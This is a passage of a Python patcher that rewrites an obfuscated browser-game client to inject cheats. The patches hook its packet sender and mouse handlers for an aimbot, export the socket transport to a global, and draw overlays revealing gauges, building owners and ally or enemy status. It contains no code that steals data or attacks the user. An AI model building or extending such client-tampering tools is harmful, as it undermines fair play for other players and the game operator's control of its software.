        hit = _PREFIX_DEPTH_CACHE.get(id(line))
        if hit is not None and hit[0] is line:
            return hit[1]
        out = [0]
        depth, in_str = 0, None
        k, n = 0, len(line)
        while k < n:
            ch = line[k]
            if in_str:
                if ch == '\\':
                    k += 1
                    out.append(depth)
                elif ch == in_str:
                    in_str = None
            elif ch in '"\'`':
                in_str = ch
            elif ch == '[':
                depth += 1
            elif ch == ']':
                depth = max(0, depth - 1)
            k += 1
            out.append(depth)
        if len(_PREFIX_DEPTH_CACHE) > 8:
            _PREFIX_DEPTH_CACHE.clear()
        _PREFIX_DEPTH_CACHE[id(line)] = (line, out)
        return out

    def _prefix_array_depth(line, col):
        depths = _prefix_depths(line)
        if col >= len(depths):
            col = len(depths) - 1
        return depths[col]

    def statement_end(line, start):
        """Index just past the `;` that closes the statement containing `start`.

        Returns None when the statement does not end on this line, so the
        caller can refuse to inject rather than cut a line in half.
        """
        depth, in_str = 0, None
        k = start
        while k < len(line):
            ch = line[k]
            if in_str:
                if ch == '\\':
                    k += 1
                elif ch == in_str:
                    in_str = None
            elif ch in '"\'`':
                in_str = ch
            elif ch in '([{':
                depth += 1
            elif ch in ')]}':
                depth -= 1
                if depth < 0:
                    return None          # statement is not self-contained here
            elif ch == ';' and depth == 0:
                return k + 1
            k += 1
        return None

    def insert_after_statement(i, col, body):
        """Patch that inserts `body` after the `;` ending the statement at col."""
        line = L[i]
        end = statement_end(line, col)
        if end is None:
            return None
        head, tail = line[:end], line[end:]
        indent = re.match(r'\s*', line).group(0) or '      '
        new = [head] + [indent + b.strip() for b in body]
        if tail.strip():
            new.append(indent + tail.strip())
        return (i, i + 1, new)

    # Discover the low-level packet sender instead of relying on its source
    # name.  Obfuscated clients may rename `sendPacket`, while its body still
    # converts a payload to Uint8Array and forwards it to the socket.
    sender_names = {'sendPacket'}
    sender_declarations = {}
    # Match any of:  function NAME(...) {  |  const/var/let NAME = function(...) {
    # | const/var/let NAME = (...) => {  |  const/var/let NAME = (...) => {  }
    # The match end() always lands just after the opening `{`, which the
    # closing-brace scan below relies on.
    sender_decl_rx = re.compile(
        r'\bfunction\s+(?P<n1>%s)\s*\([^)]*\)\s*\{'
        r'|(?:const|var|let)\s+(?P<n2>%s)\s*=\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{'
        % (W, W))
    # Window scores come from per-line counts summed with prefix sums, so the
    # 35-line body is only materialised for the few candidates that can pass.
    _u8 = [0]
    _ab = [0]
    for line in L:
        _u8.append(_u8[-1] + line.count('Uint8Array'))
        _ab.append(_ab[-1] + line.count('ArrayBuffer'))
    _bracket_call_rx = re.compile(r'\b%s\s*\[\s*%s\s*\]\s*\(' % (W, W))
    for i, line in enumerate(L):
        dm = sender_decl_rx.search(line)
        if not dm:
            continue
        name = dm.group('n1') or dm.group('n2')
        hi = min(i + 35, len(L))
        score = (_u8[hi] - _u8[i]) * 2 + (_ab[hi] - _ab[i])
        if score < 6:
            if score + 3 < 6:
                continue
            body = '\n'.join(L[i:hi])
            score += 3 if _bracket_call_rx.search(body) else 0
        if score >= 6:
            sender_names.add(name)
            sender_declarations.setdefault(name, (i, dm))
    sender_alt = '|'.join(re.escape(x) for x in sorted(sender_names, key=len, reverse=True))

    # A packet call is valid only when it goes through a discovered sender.
    # This avoids false positives from obfuscator constant tables.
    single_rx = re.compile(
        r'\b(?:%s)\s*\(\s*%s(?:\.%s|\[%s\])\s*\(\s*\[\s*(%s|\d{1,3})\s*\]\s*\)\s*\)'
        % (sender_alt, W, W, W, W))

    sender_tokens = tuple(sender_names)

    def has_sender(text: str) -> bool:
        for tok in sender_tokens:
            if tok in text:
                return True
        return False

    cands = []  # (line index, resolved value or None, match)
    for i, s in enumerate(L):
        if not has_sender(s):
            continue
        for mm in single_rx.finditer(s):
            if LINE_ARRAY_DEPTH[i] or _prefix_array_depth(s, mm.start()):
                continue
            tok = mm.group(1)
            val = int(tok) if tok.isdigit() else resolve_const(tok)
            cands.append((i, val, mm))

    DOWN_BODY = [
        "if (MOD.jitterActive && __gk(MOD.AimBotEnabled)) {",
        "  Aimbot.send([6, Aimbot.resolve()]);",
        "}",
        "Aimbot.mouseDown = true;",
        "Aimbot.scheduleRefresh();",
    ]
    UP_BODY = [
        "Aimbot.mouseDown = false;",
        "Aimbot.scheduleRefresh();",
    ]

    def handler_body_patch(i, col, body):
        """Inject at the top of an inline handler body after `col`."""
        line = L[i]
        m_open = re.compile(r'(?:=>|function\s*\**\s*%s?\s*\([^)]*\))\s*\{' % W).search(line, col)
        if not m_open:
            return None
        at = m_open.end()
        indent = re.match(r'\s*', line).group(0) or '      '
        head, tail = line[:at], line[at:]
        new = [head] + [indent + '  ' + b.strip() for b in body]
        if tail.strip():
            new.append(indent + '  ' + tail.strip())
        return (i, i + 1, new)

    def named_handler_patch(name, body):
        """Inject into `function NAME(...) {`, including Unicode names."""
        pat = re.compile(r'\bfunction\s+' + re.escape(name) + r'\s*\([^)]*\)\s*\{')
        for i, line in enumerate(L):
            mm = pat.search(line)
            if mm:
                indent = re.match(r'\s*', line).group(0) or '      '
                head, tail = line[:mm.end()], line[mm.end():]
                new = [head] + [indent + '  ' + b.strip() for b in body]
                if tail.strip():
                    new.append(indent + '  ' + tail.strip())
                return (i, i + 1, new)
        return None

    def find_dom_handlers():
        """Find inline or named DOM mouse handlers despite renamed methods."""
        found = {}
        event_rx = re.compile(
            r'(?:%s(?:\.%s|\[%s\]))\s*\(\s*["\']'
            r'(mousedown|mouseup|pointerdown|pointerup)["\']\s*,\s*'
            r'(?P<handler>function\b|%s)' % (W, W, W, W))
        for i, line in enumerate(L):
            if LINE_ARRAY_DEPTH[i]:
                continue
            if 'mouse' not in line and 'pointer' not in line:
                continue
            for mm in event_rx.finditer(line):
                kind = 'down' if mm.group(1).endswith('down') else 'up'
                found.setdefault(kind, (i, mm.end(), mm.group('handler')))
        return found

    mouse_patches = []
    downs = [(i, mm) for i, v, mm in cands if v == 4]
    ups = [(i, mm) for i, v, mm in cands if v == 5]
    if downs and ups:
        i_md, m_md = downs[0]
        i_mu, m_mu = min(ups, key=lambda t: abs(t[0] - i_md))
        p_down = insert_after_statement(i_md, m_md.end(), DOWN_BODY)
        p_up = insert_after_statement(i_mu, m_mu.end(), UP_BODY)
        if p_down and p_up and i_md != i_mu:
            mouse_patches = [p_down, p_up]

    if not mouse_patches:
        handlers = find_dom_handlers()
        if 'down' in handlers and 'up' in handlers:
            hd, hu = handlers['down'], handlers['up']
            p_down = (handler_body_patch(hd[0], hd[1], DOWN_BODY)
                      if hd[2] == 'function' else named_handler_patch(hd[2], DOWN_BODY))
            p_up = (handler_body_patch(hu[0], hu[1], UP_BODY)
                    if hu[2] == 'function' else named_handler_patch(hu[2], UP_BODY))
            if p_down and p_up and p_down[0] != p_up[0]:
                mouse_patches = [p_down, p_up]

    if not mouse_patches:
        fail("mouse down/up hooks",
             "no resolvable packet 4/5 pair and no inline or named DOM mouse handlers found")

    patches.extend(mouse_patches)

    # Block the attack packet [4] while RMB-open is active by wrapping each
    # `sender(...([4]))` call expression - NOT the shared sender function,
    # which also carries door-open/chat packets.
    try:
        by_line = {}
        for i4, m4 in downs:
            by_line.setdefault(i4, []).append(m4)
        for i4, mlist in by_line.items():
            line4 = L[i4]
            for m4 in sorted(mlist, key=lambda m: -m.start()):
                line4 = (line4[:m4.start()]
                         + '((typeof GROK_MOD !== "undefined" && GROK_MOD.hit === false) ? 0 : '
                         + m4.group(0) + ')'
                         + line4[m4.end():])
            patches.append((i4, i4 + 1, [line4]))
    except Exception:
        pass

    # ---- 6) angle packets [6, x] -> guarded ----
    # Require the discovered low-level sender, but allow every renaming/access
    # form of the encoder wrapper and resolve arbitrarily renamed opcode aliases.
    angle_rx = re.compile(
        r'\b(?P<sender>%s)\s*\(\s*'
        r'(?:(?P<encoder>%s\s*(?:\.\s*%s|\[\s*%s\s*\])?)\s*\(\s*)?'
        r'\[\s*(?P<opcode>%s|\d{1,3})\s*,\s*[^\[\]{}]{1,192}?\]\s*\)+'
        % (sender_alt, W, W, W, W))

    def opcode_is_six(tok):
        val = int(tok) if tok.isdigit() else resolve_const(tok)
        return val == 6

    angle_hits = {}
    for i, line in enumerate(L):
        if LINE_ARRAY_DEPTH[i] or not has_sender(line):
            continue
        for mm in angle_rx.finditer(line):
            if opcode_is_six(mm.group('opcode')) and not _prefix_array_depth(line, mm.start()):
                angle_hits.setdefault(i, []).append(mm)
    if not angle_hits:
        fail("angle packet with opcode 6",
             "no two-element array sent through the structurally detected packet sender")

    # The injected block can live outside the lexical scope that owns the real
    # sender/encoder.  Export a tiny closure from inside that scope instead of
    # writing their local names directly into AimbotCon.send().
    first_angle = next(iter(angle_hits.values()))[0]
    packet_sender = first_angle.group('sender').strip()
    packet_encoder = first_angle.group('encoder')
    if packet_encoder:
        packet_transport = "%s(%s(packet));" % (packet_sender, packet_encoder.strip())
    else:
        packet_transport = "%s(packet);" % packet_sender

    sender_decl = sender_declarations.get(packet_sender)
    if sender_decl is None:
        # `sendPacket` is retained as a compatibility candidate; still require
        # its declaration so the bridge is never emitted in the wrong scope.
        # Cover both `function NAME(...) {` and assignment forms.
        sender_pat = re.compile(
            r'\bfunction\s+' + re.escape(packet_sender) + r'\s*\([^)]*\)\s*\{'
            r'|(?:const|var|let)\s+' + re.escape(packet_sender) + r'\s*=\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{')
        for sender_i, sender_line in enumerate(L):
            sender_match = sender_pat.search(sender_line)
            if sender_match:
                sender_decl = (sender_i, sender_match)
                break
    if sender_decl is None:
        fail("packet sender declaration", "sender call found as `%s`, but its function body was not found" % packet_sender)

    sender_i, sender_match = sender_decl
    depth = 1
    sender_close = None
    in_string = None
    escaped = False
    for close_i in range(sender_i, min(sender_i + 120, len(L))):
        text = L[close_i]
        start_col = sender_match.end() if close_i == sender_i else 0
        for ch in text[start_col:]:
            if in_string:
                if escaped:
                    escaped = False
                elif ch == '\\':
                    escaped = True
                elif ch == in_string:
                    in_string = None
                continue
            if ch in ('"', "'", '`'):
                in_string = ch
            elif ch == '{':
                depth += 1
            elif ch == '}':
                depth -= 1
                if depth == 0:
                    sender_close = close_i
                    break
        if sender_close is not None:
            break
    if sender_close is None:
        fail("packet sender closing brace", "could not safely export its scoped transport")

    sender_indent = re.match(r'\s*', L[sender_i]).group(0)
    patches.append((sender_close + 1, sender_close + 1, [
        sender_indent + "globalThis.__autoPortAimbotPacketTransport = function (packet) {",
        sender_indent + "  try {",
        sender_indent + "    if (typeof socket === \"undefined\" || !socket || socket.readyState !== 1) return;",
        sender_indent + "    " + packet_transport,
        sender_indent + "  } catch (e) {}",
        sender_indent + "};",
    ]))

    # Keep the native angle sender and replace only its angle expression.  The
    # old guard suppressed the native statement and sent from refresh(), which
    # could be skipped by the injected death/active-state checks.  Reusing the
    # original statement preserves the client's timing, socket and encoder.
    for i, ms in angle_hits.items():
        line = L[i]
        for mm in reversed(ms):
            packet = mm.group(0)
            # Locate the top-level comma in the packet array, then wrap the
            # second element without making assumptions about its spelling.
            opcode_pos = mm.start('opcode') - mm.start()
            lb = packet.rfind('[', 0, opcode_pos + 1)
            if lb < 0:
                fail("angle packet array", "matched sender call has no array")
            depth = 0
            comma = close = None
            in_string = None
            escaped = False
            for pos in range(lb, len(packet)):
                ch = packet[pos]
                if in_string:
                    if escaped:
                        escaped = False
                    elif ch == '\\':
                        escaped = True
                    elif ch == in_string:
                        in_string = None
                    continue
                if ch in ('"', "'", '`'):
                    in_string = ch
                elif ch in '([{':
                    depth += 1
                elif ch in ')]}':
                    if ch == ']' and depth == 1:
                        close = pos
                        break
                    depth -= 1
                elif ch == ',' and depth == 1 and comma is None:
                    comma = pos
            if comma is None or close is None:
                fail("angle packet arguments", "could not isolate the angle expression")
            original_angle = packet[comma + 1:close].strip()
            replacement = ('Aimbot.packetAngle(%s)' % original_angle)
            patched_packet = packet[:comma + 1] + ' ' + replacement + packet[close:]
            line = line[:mm.start()] + patched_packet + line[mm.end():]
        patches.append((i, i + 1, [line]))

    # ---- 7) real angles ----
    # Handled after injection by patch_real_angles(): the local-player angle
    # branch is the anchor there, and that same repair must also run on
    # clients that already carry a ported aimbot.

    # ---- 8) camera + scale: `SCALE = x;` followed by `a = b / SCALE;` twice ----
    frame_cands = []
    scale_rx = re.compile(r'^\s*(%s) = %s;$' % (W, W))
    for i, s in enumerate(L):
        ms = scale_rx.match(s)
        if not ms or i + 2 >= len(L):
            continue
        sc = re.escape(ms.group(1))
        if re.match(r'^\s*%s = %s / %s;$' % (W, W, sc), L[i + 1]) and \
           re.match(r'^\s*%s = %s / %s;$' % (W, W, sc), L[i + 2]):
            frame_cands.append((i, ms.group(1)))
    if not frame_cands:
        fail("frame scale block (`X = Y;` then `A = B / X;` twice)")
    i_call, SCALE = frame_cands[0]

    # camera offsets: inside a draw function, two consecutive coordinates have
    # the form `var x = CAMX + entity[field]; var y = CAMY + entity[field];`.
    # Accept dot/bracket access and Unicode identifiers.
    CAMX = CAMY = None
    fn_rx = re.compile(r'^\s+function %s\((%s)\) \{$' % (W, W))
    # Cheap per-line pre-filter: the coordinate statements always look like
    # `var x = A + b.field;`.  Only adjacent candidate pairs are handed to the
    # expensive pattern, instead of regexing an 80-line window per function.
    coord_line = ['var ' in ln and '+' in ln and ';' in ln for ln in L]
    for i, s in enumerate(L):
        mf = fn_rx.match(s)
        if not mf or 'AimbotDraw' in s:
            continue
        b_var = re.escape(mf.group(1))
        prop = r'(?:\.%s|\[%s\])' % (W, W)
        cam_rx = re.compile(r'var %s\s*=\s*(%s)\s*\+\s*%s%s;\n\s*var %s\s*=\s*(%s)\s*\+\s*%s%s;'
                            % (W, W, b_var, prop, W, W, b_var, prop))
        mcam = None
        for j in range(i, min(i + 79, len(L) - 1)):
            if not (coord_line[j] and coord_line[j + 1]):
                continue
            mcam = cam_rx.search(L[j] + '\n' + L[j + 1])
            if mcam:
                break
        if mcam:
            CAMX, CAMY = mcam.group(1), mcam.group(2)
            break
    if not CAMX:
        fail("camera offsets (`var x = CAMX + entity[field]; var y = CAMY + entity[field];` in a draw function)")

    # ---- 8a2) main tick: galaxy ground + ESP overlays ----
    # The frame tick looks like
    #     function <tick>() {
    #       ...update calls...
    #       if (World.<x> > <n>) { <transitionFn>(); }
    #       Entitie.<gc>();
    #     }
    # The `#3D5942` fill lives in the transition renderer, which paints onto an
    # OFFSCREEN canvas (`ctx` is swapped there) and only runs during day/night
    # fades — a graft there never shows during normal play.  The real ground is
    # the canvas element's CSS background, so the galaxy is applied as that
    # background and scrolled with the camera, while the ESP overlays draw on
    # `ctx` right before the entity GC call (top layer of the frame).
    frame_i = ent_call_i = None
    for i, s in enumerate(L):
        if not re.match(r'^\s*Entitie\.%s\(\);\s*$' % W, s):
            continue
        for j in range(max(0, i - 8), i):
            if not re.search(r'if\s*\(\s*[^)]*?(?:World(?:\.|\[)\s*%s\s*\]?\s*>|<\s*World(?:\.|\[)\s*%s\s*\]?)' % (W, W), L[j]):
                continue
            for k in range(j, max(0, j - 400), -1):
                if re.match(r'^\s*function\s+%s\(\)\s*\{?\s*$' % W, L[k]):
                    frame_i = k
                    ent_call_i = i
                    break
            break
        if frame_i is not None:
            break
    if frame_i is None or ent_call_i is None:
        fail("main tick fn (`if (World.<x> > <n>) { <fn>(); }` followed by `Entitie.<m>();`)")

    esp_lines = []
    # numeric gauges (hp/food/temp/stam) - the HUD object is found at runtime
    # by its shape: a World child holding >=4 sub-objects that carry numbers
    esp_lines += [
        "      try {",
        "        if (__gk(MOD.ShowGauges) && typeof World !== \"undefined\" && ctx && ctx.canvas) {",
        "          if (!window._grokGauges) {",
        "            window._grokGauges = (function() {",
        "              try {",
        "                for (var _k in World) {",
        "                  var _c = World[_k];",
        "                  if (!_c || typeof _c !== \"object\") continue;",
        "                  var _subs = [];",
        "                  for (var _kk in _c) {",
        "                    var _v = _c[_kk];",
        "                    if (_v && typeof _v === \"object\" && typeof _v.value === \"number\") _subs.push(_v);",
        "                  }",
        "                  if (_subs.length >= 4) return _subs;",
        "                }",
        "              } catch (e) {}",
        "              return null;",
        "            })();",
        "          }",
        "          var _gGs = window._grokGauges;",
        "          if (_gGs && _gGs.length >= 4) {",
        "            var _uS = ctx.canvas.height / (window.innerHeight || ctx.canvas.height) || 1;",
        "            var _gv = function(g) {",
        "              var v = g && typeof g.value === \"number\" ? g.value : null;",
        "              if (typeof v !== \"number\") { for (var _kk in g) { if (typeof g[_kk] === \"number\") { v = g[_kk]; break; } } }",
        "              return (typeof v === \"number\" && isFinite(v)) ? String(Math.floor(v)) : \"--\";",
        "            };",
        "            ctx.save();",
        "            ctx.globalAlpha = 1;",
        "            ctx.textAlign = \"center\";",
        "            ctx.textBaseline = \"middle\";",
        "            ctx.strokeStyle = \"#000000\";",
        "            ctx.fillStyle = \"#FFFFFF\";",
        "            ctx.lineWidth = Math.max(2, Math.floor(3 * _uS));",
        "            ctx.font = \"700 \" + Math.max(14, Math.floor(20 * _uS)) + \"px Viga, Arial, sans-serif\";",
        "            var _hpX = 203 * _uS, _hpY = ctx.canvas.height - 142 * _uS;",
        "            ctx.strokeText(_gv(_gGs[0]), _hpX, _hpY);",
        "            ctx.fillText(_gv(_gGs[0]), _hpX, _hpY);",
        "            ctx.font = \"700 \" + Math.max(12, Math.floor(18 * _uS)) + \"px Viga, Arial, sans-serif\";",
        "            var _icY = ctx.canvas.height - 23 * _uS;",
        "            var _xs = [43, 109, 176];",
        "            for (var _gi = 0; _gi < 3 && _gi + 1 < _gGs.length; _gi++) {",
        "              var _t = _gv(_gGs[_gi + 1]);",
        "              ctx.strokeText(_t, _xs[_gi] * _uS, _icY);",
        "              ctx.fillText(_t, _xs[_gi] * _uS, _icY);",
        "            }",
        "            ctx.restore();",
        "          }",
        "        }",
        "      } catch (e) {}",
    ]
    patches.append((ent_call_i, ent_call_i, esp_lines))

    # ---- 8a3) building-owner tag inside the placed-block render fns ----
    # Donor behaviour: the "#owner" tag is drawn from inside the entity render
    # function itself - only when the cursor's snapped 100px cell equals the
    # entity's own authoritative grid cell (ENT.GX/ENT.GY), reading the owner
    # pid straight off the entity (ENT.PID).  No side map, no rebuilds, no
    # pos-anchor drift.  The client stamps the tile map at the top of every
    # block-render fn as
    #     MAP[ent.GY][ent.GX].f = c;
    #     MAP[ent.GY][ent.GX].f = ent.PID;     <- anchor line
    #     MAP[ent.GY][ent.GX].f = c;
    # so we find every such write and graft the overlay right after it.
    own_rx = re.compile(
        r'^(\s*)(%s)\[(%s)\.(%s)\]\[\3\.(%s)\]\.(%s)\s*=\s*\3\.(%s)\s*;'
        % (W, W, W, W, W, W))
    own_hits = []
    for i, s in enumerate(L):
        mo = own_rx.match(s)
        if mo:
            own_hits.append((i, mo.group(1), mo.group(2), mo.group(3),
                             mo.group(4), mo.group(5), mo.group(6),
                             mo.group(7)))
    if not own_hits:
        fail("owner tile write (`MAP[ent.GY][ent.GX].f = ent.PID`)")
    TILEMAP, TILEOWN = own_hits[0][2], own_hits[0][6]

    # "this cell holds a placed object" flags: the client compares tile cells
    # as `cell.<flag> === <const>` in collision/door logic, usually through a
    # local alias (`var X = MAP[a][b]; X.flag === C`).  Collect comparisons
    # both on the map and on its aliases; the RHS must be a module-level
    # constant (declared `var/const X =`), not a per-function local.
    # tile-map aliases: `V = MAP[` - found by locating `MAP[` and looking back
    # (a `(W)\s*=` finditer over the whole file backtracks quadratically on
    # long literal lines)
    _aliases = set()
    _assign_tail = re.compile(r'(%s)\s*=\s*$' % W)
    for _m in re.finditer(re.escape(TILEMAP) + r'\[', src):
        _ctx = src[max(0, _m.start() - 120):_m.start()]
        _am = _assign_tail.search(_ctx)
        if _am:
            _aliases.add(_am.group(1))
    _consts = set()
    for _s in L:
        # indent <= 4 so function-scope locals like `var X = 0` don't count
        _cm = re.match(r'\s{0,4}(?:var|const|let)\s+(%s)\s*=\s*[-0-9]'
                       % W, _s)
        if _cm:
            _consts.add(_cm.group(1))
    # "this cell holds a placed block": the type-index field is set only for
    # building-type entities (writes `alias.F = <localTypeVar>` via the map
    # aliases) - its ctor init marks empty cells.  Locate the cell ctor as the
    # function containing `this.<TILEOWN> = <init>` and read every field's
    # initializer from it.
    _ctor_init = {}
    for _i, _s in enumerate(L):
        if "this.%s" % TILEOWN not in _s:
            continue
        for _fm in re.finditer(r'this\.(%s)\s*=\s*([^;,]+)' % W,
                               '\n'.join(L[_i - 40:_i + 40])):
            _ctor_init.setdefault(_fm.group(1), _fm.group(2).strip())
        break
    TILEOWN_INIT = _ctor_init.get(TILEOWN, "0")
    # field usage on aliases - literal-prefixed scans per alias (a generic
    # `(W)\.` pattern backtracks quadratically on huge string literals)
    _wfp = Counter()
    _pers = Counter()
    _ent_pid = own_hits[0][7]
    _fld_rx = {a: re.compile(re.escape(a) + r'\.(%s)\s*=\s*(%s)\s*;'
                             % (W, W)) for a in _aliases}
    _fld_eq_rx = {a: re.compile(re.escape(a) + r'\.(%s)\s*=\s*(%s)\.(%s)\s*;'
                                % (W, W, W)) for a in _aliases}
    _fld_cmp_rx = {a: re.compile(re.escape(a) + r'\.(%s)\s*===\s*(%s)'
                                 % (W, W)) for a in _aliases}
    for _s in L:
        for _a in _aliases:
            if _a not in _s:
                continue
            for _m in _fld_rx[_a].finditer(_s):
                if _m.group(2) not in _consts and not _m.group(2)[0].isdigit() \
                        and _m.group(1) in _ctor_init and _m.group(1) != TILEOWN:
                    _wfp[_m.group(1)] += 1
            for _m in _fld_cmp_rx[_a].finditer(_s):
                if _m.group(2) not in _consts and _m.group(1) in _ctor_init \
                        and _m.group(1) != TILEOWN:
                    _wfp[_m.group(1)] += 1
            for _m in _fld_eq_rx[_a].finditer(_s):
                if _m.group(3) == _ent_pid and _m.group(1) != TILEOWN \
                        and _m.group(1) in _ctor_init:
                    _pers[_m.group(1)] += 1
    TILETYPE = _wfp.most_common(1)[0][0] if _wfp else None
    TILETYPE_INIT = _ctor_init.get(TILETYPE, "0") if TILETYPE else "0"
    TILEPERS = _pers.most_common(1)[0][0] if _pers else None

    # record the persistent owner into the cell at placement time: every fn
    # that writes `cell.TILETYPE = ...` (block placed / chunk refresh) also
    # stamps `cell.TILEPERS = ent.TILEPERS`, so the overlay has a stable
    # "who placed this" for every building kind, not just floor renderers
    if TILETYPE and TILEPERS:
        _fn_hdr = re.compile(r'function\s+%s\((%s)' % (W, W))
        _typew_rx = re.compile(
            r'^(\s*)(%s)\.%s\s*=' % (W, re.escape(TILETYPE)))
        for _i2, _s2 in enumerate(L):
            _wm = _typew_rx.match(_s2)
            if not _wm or _wm.group(2) not in _aliases \
                    or TILEPERS in _s2:
                continue
            _ent = None
            for _j in range(_i2 - 1, max(0, _i2 - 60), -1):
                _fm = _fn_hdr.search(L[_j])
                if _fm:
                    _ent = _fm.group(1)
                    break
            if _ent is None:
                continue
            patches.append((_i2 + 1, _i2 + 1, [
                "%s%s.%s = %s.%s;" % (_wm.group(1), _wm.group(2),
                                      TILEPERS, _ent, TILEPERS),
            ]))

    # primary overlay: donor-exact ShowBuildingOwner - snap mouseMapCords to
    # the 100px grid, read the hovered tile's owner pid and draw that number
    # in the cell center (stroke black, fill green self/clan / red enemy)
    esp_lines.insert(0, "      try {")
    esp_lines.insert(1, "        if (__gk(MOD.ShowBuildingOwner) && typeof GetAllTargets !== \"undefined\" && GetAllTargets.mouseMapCords) {")
    esp_lines.insert(2, "          var _oGridSize = 100;")
    esp_lines.insert(3, "          var _oCx = Math.floor(Math.round(GetAllTargets.mouseMapCords.x) / _oGridSize) * _oGridSize / 100;")
    esp_lines.insert(4, "          var _oCy = Math.floor(Math.round(GetAllTargets.mouseMapCords.y) / _oGridSize) * _oGridSize / 100;")
    esp_lines.insert(5, "          var _oCel = (%s[_oCy] && %s[_oCy][_oCx]) || null;" % (TILEMAP, TILEMAP))
    _pid_expr = ("(_oCel.%s || _oCel.%s)" % (TILEPERS, TILEOWN)) if TILEPERS \
        else "_oCel.%s" % TILEOWN
    esp_lines.insert(6, "          var _oPid = _oCel ? %s : 0;" % _pid_expr)
    _hasb = ("_oCel.%s !== %s && _oCel.%s !== 0"
             % (TILETYPE, TILETYPE_INIT, TILETYPE)) if TILETYPE else "true"
    esp_lines.insert(7, "          try { window._oDbgOwn = { cx: _oCx, cy: _oCy, pid: _oPid, hasB: !!(_oCel && %s), ty: _oCel && _oCel.%s }; } catch (e) {}" % (_hasb, TILETYPE or "\"?\""))
    esp_lines.insert(8, "          if (_oCel && _oPid !== 0) {")
    esp_lines.insert(9, "            var _oCounterX = %s * (_oCx * 100 + %s + 50);" % (SCALE, CAMX))
    esp_lines.insert(10, "            var _oCounterY = %s * (_oCy * 100 + %s + 50);" % (SCALE, CAMY))
    esp_lines.insert(11, "            ctx.save();")
    esp_lines.insert(12, "            ctx.lineWidth = 4;")
    esp_lines.insert(13, "            ctx.strokeStyle = \"#000000\";")
    esp_lines.insert(14, "            ctx.font = \"20px 'Viga', sans-serif\";")
    esp_lines.insert(15, "            ctx.textAlign = \"center\";")
    esp_lines.insert(16, "            ctx.textBaseline = \"middle\";")
    esp_lines.insert(17, "            ctx.strokeText(_oPid, _oCounterX, _oCounterY);")
    esp_lines.insert(18, "            var _oPl = World.players && World.players[_oPid];")
    esp_lines.insert(19, "            var _oC = \"#FF0000\";")
    esp_lines.insert(20, "            if (World.PLAYER && _oPid === World.PLAYER[%s]) { _oC = \"#00FF00\"; }" % MYID)
    esp_lines.insert(21, "            else if (_oPl && _oPl.%s !== -1) { _oC = (World.PLAYER && _oPl.%s === World.PLAYER.%s) ? \"#00FF00\" : \"#FF0000\"; }" % (T_clan, T_clan, T_clan))
    esp_lines.insert(22, "            ctx.fillStyle = _oC;")
    esp_lines.insert(23, "            ctx.fillText(_oPid, _oCounterX, _oCounterY);")
    esp_lines.insert(24, "            ctx.restore();")
    esp_lines.insert(25, "          }")
    esp_lines.insert(26, "        }")
    esp_lines.insert(27, "      } catch (e) {}")

    # secondary overlay: also graft inside each block-render fn that stamps
    # the tile map - tags entities whose own grid cell is hovered even if the
    # tile-flag heuristic misses them
    for (oi, oind, omap, oent, ogy, ogx, ocf, opid) in own_hits:
        patches.append((oi + 1, oi + 1, [
            oind + "  try {",
            oind + "    if (__gk(MOD.ShowBuildingOwner) && typeof GetAllTargets !== \"undefined\" && GetAllTargets.mouseMapCords) {",
            oind + "      var _oMx = Math.floor(Math.round(GetAllTargets.mouseMapCords.x) / 100);",
            oind + "      var _oMy = Math.floor(Math.round(GetAllTargets.mouseMapCords.y) / 100);",
            oind + "      var _oPid = %s.%s;" % (oent, opid),
            oind + "      if (%s !== World.PLAYER && _oMx === %s.%s && _oMy === %s.%s && _oPid !== 0) {" % (oent, oent, ogx, oent, ogy),
            oind + "        var _oCounterX = %s * (%s.%s * 100 + %s + 50);" % (SCALE, oent, ogx, CAMX),
            oind + "        var _oCounterY = %s * (%s.%s * 100 + %s + 50);" % (SCALE, oent, ogy, CAMY),
            oind + "        ctx.save();",
            oind + "        ctx.lineWidth = 4;",
            oind + "        ctx.strokeStyle = \"#000000\";",
            oind + "        ctx.font = \"20px 'Viga', sans-serif\";",
            oind + "        ctx.textAlign = \"center\";",
            oind + "        ctx.textBaseline = \"middle\";",
            oind + "        ctx.strokeText(_oPid, _oCounterX, _oCounterY);",
            oind + "        var _oPl = World.players && World.players[_oPid];",
            oind + "        var _oC = \"#FF0000\";",
            oind + "        if (World.PLAYER && _oPid === World.PLAYER[%s]) { _oC = \"#00FF00\"; }" % MYID,
            oind + "        else if (_oPl && _oPl.%s !== -1) { _oC = (World.PLAYER && _oPl.%s === World.PLAYER.%s) ? \"#00FF00\" : \"#FF0000\"; }" % (T_clan, T_clan, T_clan),
            oind + "        ctx.fillStyle = _oC;",
            oind + "        ctx.fillText(_oPid, _oCounterX, _oCounterY);",
            oind + "        ctx.restore();",
            oind + "      }",
            oind + "    }",
            oind + "  } catch (e) {}",
        ]))

    # ---- 8b) minimap player nicks (donor block) ----
    # The minimap render iterates PLAYER.<entry list> and draws one dot per
    # player:
    #   var <P> = World.players[<E>[<pidkey>]];
    #   var <dx> = Math[..](<ox> + Math[..](Math[..](<a>, <sc> * <P>[<fx>]), 400));
    #   var <dy> = Math[..](<oy> + Math[..](Math[..](<b>, <P>[<fy>] * <sc>), 400));
    #   <rend>.<fn>(<sprite>, <dx>, <dy>, <icon>, ...);
    # The donor draws the nick right after the dot call.  Detect that site
    # structurally so it survives renames across client builds.
    pl_rx = re.compile(r'var\s+(%s)\s*=\s*World\.players\[\s*(%s)\[\s*(%s)\s*\]\s*\]'
                       % (W, W, W))
    map_draw_i = P_var = E_var = pid_key = map_dx = map_dy = None
    for i, s in enumerate(L):
        mp = pl_rx.search(s)
        if not mp:
            continue
        # the entry var must come from a World.PLAYER.<list>[<i>] loop var
        if not any(re.search(r'var\s+%s\s*=\s*World\.PLAYER\.%s\[\s*%s\s*\]'
                             % (re.escape(mp.group(2)), W, W), L[k])
                   for k in range(max(0, i - 5), i)):
            continue
        dx = dy = draw_i = None
        for j in range(i + 1, min(i + 10, len(L))):
            mc = re.search(r'var\s+(%s)\s*=\s*Math\[[^\]]+\]\([^;]*,\s*400\s*\)'
                           % W, L[j])
            if mc and dx is None:
                dx = mc.group(1)
                continue
            if mc and dy is None:
                dy = mc.group(1)
                continue
            if dx and dy and re.search(
                    r'%s\.%s\([^;]*%s[^;]*%s[^;]*\);'
                    % (W, W, re.escape(dx), re.escape(dy)), L[j]):
                draw_i = j
                break
        if draw_i is not None:
            P_var, E_var, pid_key = mp.groups()
            map_dx, map_dy, map_draw_i = dx, dy, draw_i
            break
    if map_draw_i is None:
